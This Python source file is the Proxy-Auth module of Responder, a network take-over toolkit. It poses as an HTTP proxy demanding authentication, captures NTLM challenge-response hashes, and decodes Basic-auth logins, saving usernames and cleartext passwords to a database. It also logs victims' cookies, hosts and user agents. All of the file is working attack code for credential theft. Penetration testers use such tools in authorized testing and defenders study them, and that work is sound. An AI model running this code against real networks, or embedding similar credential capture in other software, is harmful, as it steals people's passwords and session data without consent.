#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import SocketServer
from HTTP import ParseHTTPHash
from packets import *
from utils import *

def GrabUserAgent(data):
	UserAgent = re.findall(r'(?<=User-Agent: )[^\r]*', data)
        if UserAgent:
           print text("[Proxy-Auth] %s" % color("User-Agent        : "+UserAgent[0], 2))

def GrabCookie(data):
	Cookie = re.search(r'(Cookie:*.\=*)[^\r\n]*', data)

	if Cookie:
		Cookie = Cookie.group(0).replace('Cookie: ', '')
		if len(Cookie) > 1:
                        if settings.Config.Verbose:
			        print text("[Proxy-Auth] %s" % color("Cookie           : "+Cookie, 2))

		return Cookie
	return False

def GrabHost(data):
	Host = re.search(r'(Host:*.\=*)[^\r\n]*', data)

	if Host:
		Host = Host.group(0).replace('Host: ', '')
                if settings.Config.Verbose:
		        print text("[Proxy-Auth] %s" % color("Host             : "+Host, 2))

		return Host
	return False

def PacketSequence(data, client):
	NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
	Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)	
	if NTLM_Auth:
		Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
		if Packet_NTLM == "\x01":
			if settings.Config.Verbose:
				print text("[Proxy-Auth] Sending NTLM authentication request to %s" % client)

			Buffer = NTLM_Challenge(ServerChallenge=settings.Config.Challenge)
			Buffer.calculate()
			Buffer_Ans = WPAD_NTLM_Challenge_Ans()
			Buffer_Ans.calculate(str(Buffer))
			return str(Buffer_Ans)
		if Packet_NTLM == "\x03":
			NTLM_Auth = b64decode(''.join(NTLM_Auth))
       	                ParseHTTPHash(NTLM_Auth, client, "Proxy-Auth")
                        GrabUserAgent(data)
                        GrabCookie(data)
                        GrabHost(data)
   	                return False #Send a RST with SO_LINGER when close() is called (see Responder.py)
		else:
               		return False

	elif Basic_Auth:
                GrabUserAgent(data)
                GrabCookie(data)
                GrabHost(data)
		ClearText_Auth = b64decode(''.join(Basic_Auth))
		SaveToDb({
			'module': 'Proxy-Auth', 
			'type': 'Basic', 
			'client': client, 
			'user': ClearText_Auth.split(':')[0], 
			'cleartext': ClearText_Auth.split(':')[1], 
			})

		return False
	else:
		if settings.Config.Basic:
			Response = WPAD_Basic_407_Ans()
			if settings.Config.Verbose:
				print text("[Proxy-Auth] Sending BASIC authentication request to %s" % client)

		else:
			Response = WPAD_Auth_407_Ans()

		return str(Response)

class Proxy_Auth(SocketServer.BaseRequestHandler):


    def handle(self):
		try:
                    for x in range(2):
                        data = self.request.recv(4096)
                        self.request.send(PacketSequence(data, self.client_address[0]))

		except:
                   	pass


